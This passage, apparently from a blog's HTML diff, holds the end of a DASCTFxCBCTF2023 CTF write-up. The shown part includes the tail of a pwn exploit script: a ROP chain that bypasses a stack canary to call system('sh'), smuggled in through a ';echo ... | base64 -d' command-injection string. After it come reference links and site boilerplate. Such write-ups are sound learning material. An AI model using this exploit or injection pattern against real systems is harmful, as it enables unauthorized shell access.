attack</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;PING&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(sh)</span><br><span class="line">+ p64(ret) +p64(system)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">pd = <span class="string">&quot;;echo &quot;</span>+<span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">pd += payload</span><br><span class="line">pd += <span class="string">&#x27;&quot; | base64 -d&#x27;</span></span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">sla(<span class="string">&quot;address:&quot;</span>,pd)</span><br><span class="line"><span class="comment">## get shell</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;CAT&quot;</span>)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">sla(<span class="string">&quot;view: &quot;</span>,<span class="string">&quot;result.txt&quot;</span>)</span><br><span class="line">io()</span><br></pre></td></tr></table></figure></div>
+
+<p>本文仅为学习记录，无商业作用。</p>
+<blockquote>
+<p>参考链接：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/mumuhhh/p/17781029.html" >https://www.cnblogs.com/mumuhhh/p/17781029.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://docs.python.org/3/library/marshal.html" >https://docs.python.org/3/library/marshal.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/mldxs/article/details/8574518" >https://blog.csdn.net/mldxs/article/details/8574518 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/#canary_3" >https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/#canary_3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://nameless.top/index.php/2023/10/22/das10%e6%9c%88%e6%9c%88%e8%b5%9bpwn%e5%87%ba%e9%a2%98%e5%bf%83%e8%b7%afcve-2023-40930%e7%9a%84%e4%bb%8b%e7%bb%8d/" >DAS10月月赛PWN出题心路&amp;&amp;CVE-2023-40930的介绍 – Nameless的摸鱼笔记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51890658/article/details/134048110" >https://blog.csdn.net/weixin_51890658&#x2F;article&#x2F;details&#x2F;134048110 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/ModesL/p/17794355.html" >https://www.cnblogs.com/ModesL/p/17794355.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> DASCTFxCBCTF2023-Study&amp;Re</li>
+        <li><strong>Author:</strong> Juana_2u</li>
+        <li><strong>Created at
+                :</strong> 2023-11-04 21:43:39</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-11-09 20:22:57
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://juana-2u.github.io/2023/11/04/DASCTFxCBCTF2023-Study&amp;Re/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf-Replay/">#ctf_Replay</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/10/18/2023XiangShan-Replay/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2023香山杯复现与学习[231016]</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-swup-reload-script>
+        import { init } from '/js/libs/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">DASCTFxCBCTF2023-Study&amp;Re</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF-X-CBCTF-2023%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0"><span class="nav-text">DASCTF X CBCTF 2023复现和学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#justlisten"><span class="nav-text">justlisten</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#auuuu3"><span class="nav-text">auuuu3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#marshal"><span class="nav-text">marshal</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GuestBook"><span class="nav-text">GuestBook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Canary%E7%BB%95%E8%BF%87"><span class="nav-text">Canary绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EASYBOX"><span class="nav-text">EASYBOX</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-text">(1) 命令注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-text">(2) 栈溢出</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">PUJIPUJIPUJI~~~~DA~~~~</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Juana_2u</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
